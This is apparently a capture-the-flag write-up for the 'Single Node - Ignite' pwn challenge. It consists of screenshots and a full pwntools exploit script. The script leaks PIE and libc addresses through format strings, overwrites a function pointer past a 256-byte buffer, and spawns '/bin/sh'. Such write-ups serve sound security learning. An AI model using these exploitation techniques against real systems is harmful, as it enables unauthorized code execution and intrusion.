---
title: Single Node - Ignite khi qualifying 2024
author: megachar0x01
date: 2024-10-30
categories: [Pwn, amd64, ctf]
---

### Purpose : Get The Flag

<img src="https://i.imgur.com/fe9fKn2.png" alt="img_1">


### Mitigations : 

<img src="https://i.imgur.com/2TSTdOO.png" alt="img_1">

### Crash :
<img src="https://i.imgur.com/5Zm5b4b.png" alt="img_1">

### Decompile :

<img src="https://i.imgur.com/o1XSkd2.png" alt="img_1">
<img src="https://i.imgur.com/nxMTQXD.png" alt="img_1">


```python
#!/usr/bin/python3
from pwn import *
import struct

# context.terminal = ['tmux','splitw','-h']
os.environ['XDG_CACHE_HOME'] = '/tmp/'

context.log_level = 'error'


info = lambda msg: log.info(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
break *main+247
continue
continue
continue
continue
'''.format(**locals())

exe = './bin'; elf = context.binary = ELF(exe);exe_rop = ROP(elf,checksec=False)
libc = elf.libc ; libc_rop = ROP(libc)

io = start()

payload =b""
payload +=b"%13$p"
payload +=b"A"*(256-len(payload))

io.sendlineafter(b"Choice: ",b"3")
io.sendlineafter(b"nter new content length:",b"512")

io.sendlineafter(b"Enter new content:",payload)

io.sendafter(b"Choice: ",b"2")

leak=u64(io.recvuntil(b"1.").split(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")[1].split(b"\n")[0]+b"\x00"*2)


print(f"pie Leak :: {hex(leak)}")

elf.address = leak - 5073

print(f"pie base :: {hex(elf.address)}")


payload =b""
payload +=b"%3$p" ## speciall thanks to Hassan aka @72goul for turning this into format string to get libc leak from stack
payload +=b"A"*(256-len(payload))
payload +=p64(elf.address+0x1100)

#payload = b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac"

io.sendlineafter(b"Choice: ",b"3")
io.sendlineafter(b"nter new content length:",b"512")

io.sendlineafter(b"Enter new content:",payload)

io.sendafter(b"Choice: ",b"0")

io.recvuntil(b"Invalid!\n")

leak_libc = int(io.recvline().split(b"AAAAAA")[0],16)


print(f"Libc leak :: {hex(leak_libc)}")


libc = elf.libc ; libc_rop = ROP(libc)

libc.address = leak_libc -1132679


print(f"Libc address :: {hex(libc.address)}")

payload =b""
payload +=b"/bin/sh\x00"
payload +=b"A"*(256-len(payload))
payload +=p64(libc.address+330323)

#payload = b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac"

io.sendlineafter(b"Choice: ",b"3")
io.sendlineafter(b"nter new content length:",b"512")

io.sendlineafter(b"Enter new content:",payload)

io.sendafter(b"Choice: ",b"0")

io.recvuntil(b"Invalid!\n")




io.interactive()



```

